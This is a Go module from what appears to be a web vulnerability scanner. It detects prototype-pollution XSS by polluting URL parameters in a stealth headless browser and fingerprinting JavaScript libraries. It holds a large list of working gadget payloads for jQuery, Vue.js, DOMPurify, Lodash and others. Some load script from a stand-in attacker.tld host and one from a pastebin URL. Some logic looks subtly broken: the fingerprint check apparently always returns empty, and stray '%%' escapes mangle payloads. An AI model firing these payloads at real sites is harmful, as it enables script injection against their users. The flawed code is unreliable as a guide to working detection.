package xss

import (
	"github.com/go-rod/rod"
	"github.com/go-rod/rod/lib/proto"
	"github.com/yhy0/Jie/pkg/output"
	"github.com/yhy0/Jie/pkg/protocols/headless"
	"github.com/yhy0/logging"
	"runtime"
	"strings"
	"time"
)

/**
  @author: yhy
  @since:  2023/3/13
  @desc: 通过 原型链污染 寻找 xss https://github.com/kleiton0x00/ppmap
**/

var fingerprint = `;() => {
  let gadgets = 'default';
  if (typeof _satellite !== 'undefined') {
    gadgets = 'Adobe Dynamic Tag Management ';
  } else if (typeof BOOMR !== 'undefined') {
    gadgets = 'Akamai Boomerang ';
  } else if (typeof goog !== 'undefined' && typeof goog.basePath !== 'undefined') {
    gadgets = 'Closure ';
  } else if (typeof DOMPurify !== 'undefined') {
    gadgets = 'DOMPurify ';
  } else if (typeof window.embedly !== 'undefined') {
    gadgets = 'Embedly Cards ';
  } else if (typeof filterXSS !== 'undefined') {
    gadgets = 'js-xss ';
  } else if (typeof ko !== 'undefined' && typeof ko.version !== 'undefined') {
    gadgets = 'Knockout.js ';
  } else if (typeof _ !== 'undefined' && typeof _.template !== 'undefined' && typeof _.VERSION !== 'undefined') {
    gadgets = 'Lodash <= 4.17.15 ';
  } else if (typeof Marionette !== 'undefined') {
    gadgets = 'Marionette.js / Backbone.js ';
  } else if (typeof recaptcha !== 'undefined') {
    gadgets = 'Google reCAPTCHA ';
  } else if (typeof sanitizeHtml !== 'undefined') {
    gadgets = 'sanitize-html ';
  } else if (typeof analytics !== 'undefined' && typeof analytics.SNIPPET_VERSION !== 'undefined') {
    gadgets = 'Segment Analytics.js ';
  } else if (typeof Sprint !== 'undefined') {
    gadgets = 'Sprint.js ';
  } else if (typeof SwiftypeObject != 'undefined') {
    gadgets = 'Swiftype Site Search ';
  } else if (typeof utag !== 'undefined' && typeof utag.id !== 'undefined') {
    gadgets = 'Tealium Universal Tag ';
  } else if (typeof twq !== 'undefined' && typeof twq.version !== 'undefined') {
    gadgets = 'Twitter Universal Website Tag ';
  } else if (typeof wistiaEmbeds !== 'undefined') {
    gadgets = 'Wistia Embedded Video ';
  } else if (typeof $ !== 'undefined' && typeof $.zepto !== 'undefined') {
    gadgets = 'Zepto.js ';
  } else if (typeof Vue != 'undefined') {
    gadgets = "Vue.js";
  } else if (typeof Popper !== 'undefined') {
    gadgets = "Popper.js";
  } else if (typeof pendo !== 'undefined') {
    gadgets = "Pendo Agent";
  } else if (typeof i18next !== 'undefined') {
    gadgets = "i18next";
  } else if (typeof Demandbase != 'undefined') {
    gadgets = "Demandbase Tag";
  } else if (typeof _analytics !== 'undefined' && typeof analyticsGtagManager !== 'undefined') {
    gadgets = "Google Tag Manager plugin for analytics";
  } else if (typeof can != 'undefined' && typeof can.deparam != 'undefined') {
    gadgets = "CanJS deparam";
  } else if (typeof $ !== 'undefined' && typeof $.parseParams !== 'undefined') {
    gadgets = "jQuery parseParams";
  } else if (typeof String.parseQueryString != 'undefined') {
    gadgets = "MooTools More";
  } else if (typeof mutiny != 'undefined') {
    gadgets = "Mutiny";
  } else if (document.getElementsByTagName('html')[0].hasAttribute('amp')) {
    gadgets = "AMP";
  } else if (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.jquery !== 'undefined') {
    gadgets = 'jQuery';
  }
 return gadgets;
};

`

var ppp = [4]string{
	"constructor%5Bprototype%5D%5Bppmap%5D=reserved",
	"__proto__.ppmap=reserved",
	"constructor.prototype.ppmap=reserved",
	"__proto__%5Bppmap%5D=reserved",
}

func Prototype(u string) {
	res := strings.Contains(u, "?")

	if res == true {
		queryEnum(u, `&`)
	} else {
		if queryEnum(u, `?`) {
			return
		}
		queryEnum(u, `#`)
	}
}

func queryEnum(u, quote string) bool {
	for _, pp := range ppp {
		full_url := u + quote + pp
		// 首先根据 payload 检测 js 是否输出 reserved
		res := runPage(full_url, `() => {window.ppmap}`)
		if res == "" {
			continue
		}
		// 具体的指纹检测
		res = runPage(u, fingerprint)

		logging.Logger.Infoln(full_url, " Gadget found: ", res)

		vulnerable := true
		payloads := []string{}
		if strings.Contains(res, "default") {
			logging.Logger.Debugln(" No gadget found")
			logging.Logger.Debugln(" Website is vulnerable to Prototype Pollution, but not automatically exploitable")
			vulnerable = false
		} else if strings.Contains(res, "Adobe Dynamic Tag Management") {
			payloads = append(payloads, u+quote+"__proto__[src]=data:,alert(1)//")
		} else if strings.Contains(res, "Akamai Boomerang") {
			payloads = append(payloads, u+quote+"__proto__[BOOMR]=1&__proto__[url]=//attacker.tld/js.js")
		} else if strings.Contains(res, "Closure") {
			payloads = append(payloads, u+quote+"__proto__[*%%20ONERROR]=1&__proto__[*%%20SRC]=1")
			payloads = append(payloads, u+quote+"__proto__[CLOSURE_BASE_PATH]=data:,alert(1)//")
		} else if strings.Contains(res, "DOMPurify") {
			payloads = append(payloads, u+quote+"__proto__[ALLOWED_ATTR][0]=onerror&__proto__[ALLOWED_ATTR][1]=src")
			payloads = append(payloads, u+quote+"__proto__[documentMode]=9")
		} else if strings.Contains(res, "Embedly") {
			payloads = append(payloads, u+quote+"__proto__[onload]=alert(1)")
		} else if strings.Contains(res, "jQuery") {
			payloads = append(payloads, u+quote+"__proto__[context]=<img/src/onerror%%3dalert(1)>&__proto__[jquery]=x")
			payloads = append(payloads, u+quote+"__proto__[url][]=data:,alert(1)//&__proto__[dataType]=script")
			payloads = append(payloads, u+quote+"__proto__[url]=data:,alert(1)//&__proto__[dataType]=script&__proto__[crossDomain]=")
			payloads = append(payloads, u+quote+"__proto__[src][]=data:,alert(1)//")
			payloads = append(payloads, u+quote+"__proto__[url]=data:,alert(1)//")
			payloads = append(payloads, u+quote+"__proto__[div][0]=1&__proto__[div][1]=<img/src/onerror%%3dalert(1)>&__proto__[div][2]=1")
			payloads = append(payloads, u+quote+"__proto__[preventDefault]=x&__proto__[handleObj]=x&__proto__[delegateTarget]=<img/src/onerror%%3dalert(1)>")
		} else if strings.Contains(res, "js-xss") {
			payloads = append(payloads, u+quote+"__proto__[whiteList][img][0]=onerror&__proto__[whiteList][img][1]=src")
		} else if strings.Contains(res, "Knockout.js") {
			payloads = append(payloads, u+quote+"__proto__[4]=a':1,[alert(1)]:1,'b&__proto__[5]=,")
		} else if strings.Contains(res, "Lodash <= 4.17.15") {
			payloads = append(payloads, u+quote+"__proto__[sourceURL]=%%E2%%80%A8%%E2%%80%%A9alert(1)")
		} else if strings.Contains(res, "Marionette.js / Backbone.js") {
			payloads = append(payloads, u+quote+"__proto__[tagName]=img&__proto__[src][]=x:&__proto__[onerror][]=alert(1)")
		} else if strings.Contains(res, "Google reCAPTCHA") {
			payloads = append(payloads, u+quote+"__proto__[srcdoc][]=<script>alert(1)</script>")
		} else if strings.Contains(res, "sanitize-html") {
			payloads = append(payloads, u+quote+"__proto__[*][]=onload")
			payloads = append(payloads, u+quote+"__proto__[innerText]=<script>alert(1)</script>")
		} else if strings.Contains(res, "Segment Analytics.js") {
			payloads = append(payloads, u+quote+"__proto__[script][0]=1&__proto__[script][1]=<img/src/onerror%%3dalert(1)>&__proto__[script][2]=1")
		} else if strings.Contains(res, "Sprint.js") {
			payloads = append(payloads, u+quote+"__proto__[div][intro]=<img%%20src%%20onerror%%3dalert(1)>")
		} else if strings.Contains(res, "Swiftype Site Search") {
			payloads = append(payloads, u+quote+"__proto__[xxx]=alert(1)")
		} else if strings.Contains(res, "Tealium Universal Tag") {
			payloads = append(payloads, u+quote+"__proto__[attrs][src]=1&__proto__[src]=//attacker.tld/js.js")
		} else if strings.Contains(res, "Twitter Universal Website Tag") {
			payloads = append(payloads, u+quote+"__proto__[attrs][src]=1&__proto__[hif][]=javascript:alert(1)")
		} else if strings.Contains(res, "Wistia Embedded Video") {
			payloads = append(payloads, u+quote+"__proto__[innerHTML]=<img/src/onerror=alert(1)>")
		} else if strings.Contains(res, "Zepto.js") {
			payloads = append(payloads, u+quote+"__proto__[onerror]=alert(1)")
		} else if strings.Contains(res, "Vue.js") {
			payloads = append(payloads, u+quote+"__proto__[v-if]=_c.constructor('alert(1)')()")
			payloads = append(payloads, u+quote+"__proto__[attrs][0][name]=src&__proto__[attrs][0][value]=xxx&__proto__[xxx]=data:,alert(1)//&__proto__[is]=script")
			payloads = append(payloads, u+quote+"__proto__[v-bind:class]=''.constructor.constructor('alert(1)')()")
			payloads = append(payloads, u+quote+"__proto__[data]=a&__proto__[template][nodeType]=a&__proto__[template][innerHTML]=<script>alert(1)</script>")
			payloads = append(payloads, u+quote+`__proto__[props][][value]=a&__proto__[name]=":''.constructor.constructor('alert(1)')(),"")`)
			payloads = append(payloads, u+quote+"__proto__[template]=<script>alert(1)</script>")
		} else if strings.Contains(res, "Popper.js") {
			payloads = append(payloads, u+quote+"__proto__[arrow][style]=color:red;transition:all%%201s&__proto__[arrow][ontransitionend]=alert(1)")
			payloads = append(payloads, u+quote+"__proto__[reference][style]=color:red;transition:all%%201s&__proto__[reference][ontransitionend]=alert(2)")
			payloads = append(payloads, u+quote+"__proto__[popper][style]=color:red;transition:all%%201s&__proto__[popper][ontransitionend]=alert(3)")
		} else if strings.Contains(res, "Pendo Agent") {
			payloads = append(payloads, u+quote+"__proto__[dataHost]=attacker.tld/js.js%%23")
		} else if strings.Contains(res, "i18next") {
			payloads = append(payloads, u+quote+"__proto__[lng]=cimode&__proto__[appendNamespaceToCIMode]=x&__proto__[nsSeparator]=<img/src/onerror%%3dalert(1)>")
			payloads = append(payloads, u+quote+"__proto__[lng]=a&__proto__[a]=b&__proto__[obj]=c&__proto__[k]=d&__proto__[d]=<img/src/onerror%%3dalert(1)>")
			payloads = append(payloads, u+quote+"__proto__[lng]=a&__proto__[key]=<img/src/onerror%%3dalert(1)>")
		} else if strings.Contains(res, "Demandbase Tag") {
			payloads = append(payloads, u+quote+"__proto__[Config][SiteOptimization][enabled]=1&__proto__[Config][SiteOptimization][recommendationApiURL]=//attacker.tld/json_cors.php?")
		} else if strings.Contains(res, "Google Tag Manager plugin for analytics") {
			payloads = append(payloads, u+quote+"__proto__[customScriptSrc]=//attacker.tld/xss.js")
		} else if strings.Contains(res, "CanJS deparam") {
			payloads = append(payloads, u+quote+"__proto__[test]=test")
			payloads = append(payloads, u+quote+"?constructor[prototype][test]=test")
		} else if strings.Contains(res, "jQuery parseParams") {
			payloads = append(payloads, u+quote+"__proto__.test=test")
			payloads = append(payloads, u+quote+"?constructor.prototype.test=test")
		} else if strings.Contains(res, "MooTools More") {
			payloads = append(payloads, u+quote+"__proto__[test]=test")
			payloads = append(payloads, u+quote+"?constructor[prototype][test]=test")
		} else if strings.Contains(res, "Mutiny") {
			payloads = append(payloads, u+quote+"__proto__.test=test")
		} else if strings.Contains(res, "AMP") {
			payloads = append(payloads, u+quote+"__proto__.ampUrlPrefix=https://pastebin.com/raw/E9f7BSwb")
		}

		if vulnerable {

			for _, payload := range payloads {
				if Verification(payload, u) {
					return true
				}
			}

			// 没有的话,手动测试
			output.OutChannel <- output.VulMessage{
				DataType: "web_vul",
				Plugin:   "XSS",
				VulnData: output.VulnData{
					CreateTime: time.Now().Format("2006-01-02 15:04:05"),
					Target:     u,
					VulnType:   "Prototype Pollution XSS",
					Method:     "GET",
					Payload:    "Gadget " + res + " \t possible payloads \n" + strings.Join(payloads, "\n"),
				},
				Level: output.Medium,
			}

			return true
		}

	}

	return false
}

func runPage(target string, jsCode string) string {
	// todo 怎么写，才能没有 panic ，现在已知 Must** 字样的都有可能导致
	defer func() {
		if err := recover(); err != nil {
			logging.Logger.Errorln("recover from:", err)
			debugStack := make([]byte, 1024)
			runtime.Stack(debugStack, false)
			logging.Logger.Errorf("Stack Trace:%v", string(debugStack))

		}
	}()
	// 创建tab
	page, err := headless.RodHeadless.Browser.Page(proto.TargetCreateTarget{URL: target})

	if err != nil {
		logging.Logger.Debugln(target, "could not create target, ", err)
		return ""
	}
	defer page.Close()

	// 设置超时时间
	timeout := 5 * time.Second
	page = page.Timeout(timeout)

	// 创建一个劫持请求, 用于屏蔽某些请求, img、font
	router := headless.RodHeadless.Browser.HijackRequests()
	defer router.MustStop()
	router.MustAdd("*", func(ctx *rod.Hijack) {
		// *.woff2 字体
		if ctx.Request.Type() == proto.NetworkResourceTypeFont {
			ctx.Response.Fail(proto.NetworkErrorReasonBlockedByClient)
			return
		}
		// 图片
		if ctx.Request.Type() == proto.NetworkResourceTypeImage {
			ctx.Response.Fail(proto.NetworkErrorReasonBlockedByClient)
			return
		}
	})

	go router.Run()

	// 整个 dom 加载前注入 js 绕过无头浏览器检测 https://bot.sannysoft.com
	_, err = page.EvalOnNewDocument(headless.StealthJS)
	if err != nil {
		return ""
	}

	// Must 开头的函数 必须在 WaitLoad 后边?
	if err = page.WaitLoad(); err != nil {
		logging.Logger.Debugf("\"%s\" on wait load: %s", target, err)
		return ""
	}

	// dom 加载完后注入js, 检测 原型链 xss
	res := page.MustEval(jsCode).String()

	if res != "reserved" {
		return ""
	}
	return res
}
